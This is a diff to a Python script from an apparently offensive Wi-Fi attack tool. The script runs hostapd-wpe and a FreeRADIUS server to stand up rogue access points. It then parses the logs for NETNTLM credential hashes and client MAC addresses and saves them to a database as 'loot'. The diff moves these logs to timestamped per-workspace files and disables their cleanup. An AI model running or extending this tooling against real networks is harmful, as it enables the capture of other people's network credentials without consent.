@@ -6,7 +6,7 @@ import sys, time
 sys.path.insert(0, 'lib/')
 from Queries import *
 import os
-
+from datetime import datetime
 parser = argparse.ArgumentParser(usage=SUPPRESS)
 parser.add_argument('-i', '--interface', metavar='Interface', dest='interface', action='store', help='Interface to use\n', required=True)
 parser.add_argument('-s', '--ssid', metavar='SSID', dest='ssid', action='store', help=argparse.SUPPRESS, required=True)
@@ -33,7 +33,10 @@ def main():
 	twofourGhz_channels = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14"]
 
 	path = "module/hostapd/hostapd/"
-
+	lootpath = workspace.split("/")
+	lootpath = lootpath[1]
+	date = datetime.now().strftime('%Y_%m_%d_%H_%M')
+	timestamp = date
 
 	if attack in ["Captive Portal"]:
 		if channel in fiveGhz_channels:
@@ -155,7 +158,7 @@ def main():
 					"pac_key_refresh_time=86400\n"
 					"pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f\n"
 					"hw_mode=" + hw_mode +"\n"
-					"wpe_logfile=module/loot.log\n"
+					"wpe_logfile=db/"+lootpath+"/loot"+timestamp+".log\n"
 					)
 
 		if hw_mode == "a":
@@ -207,14 +210,14 @@ def main():
 			time.sleep(10)
 			print "Setting up Radius server"
 			subprocess.call('tmux select-pane -t 1', shell=True)
-			subprocess.call('tmux send-keys \"./module/freeradius/src/main/radiusd -X | tee module/rad.log" C-m', shell=True)
+			subprocess.call('tmux send-keys \"./module/freeradius/src/main/radiusd -X | tee db/'+lootpath+'/rad'+timestamp+'.log\" C-m', shell=True)
 			time.sleep(5)
 			print "Happy Hunting"
 			record = []
 			try:
 				count = 0
 				while count < 10:
-					with open('module/rad.log','r') as f:
+					with open('db/'+lootpath+'/rad'+timestamp+'.log','r') as f:
 						for line in f:
 							if 'Calling-Station-Id' in line:
 								MAC = line.replace('	Calling-Station-Id = "','')
@@ -246,11 +249,11 @@ def main():
 				subprocess.call('killall hostapd-wpe', shell=True)
 				subprocess.call('killall lt-radiusd', shell=True)
 				subprocess.call('tmux kill-session -t exploit', shell=True)
-				subprocess.call('rm -rf module/rad.log', shell=True)
+				#subprocess.call('rm -rf module/rad.log', shell=True)
 		else:        
-			subprocess.call('touch module/loot.log', shell=True)
+			subprocess.call('touch db/'+lootpath+'/loot'+timestamp+'.log', shell=True)
 			os.system(''+path+'hostapd-wpe '+path+'hostapd-wpe.conf')
-			with open('module/loot.log') as f:
+			with open('db/'+lootpath+'/loot'+timestamp+'.log') as f:
 			  for line in f:
 				if 'NETNTLM:' in line:
 					line = line.replace('      jtr NETNTLM:   ','')
@@ -263,7 +266,7 @@ def main():
 					d = queries()
 					d.db_connect(workspace)
 					d.loot(loot)
-			subprocess.call('rm -rf module/loot.log', shell=True)
+			#subprocess.call('rm -rf module/loot.log', shell=True)
 	else:
 		pass
 	return
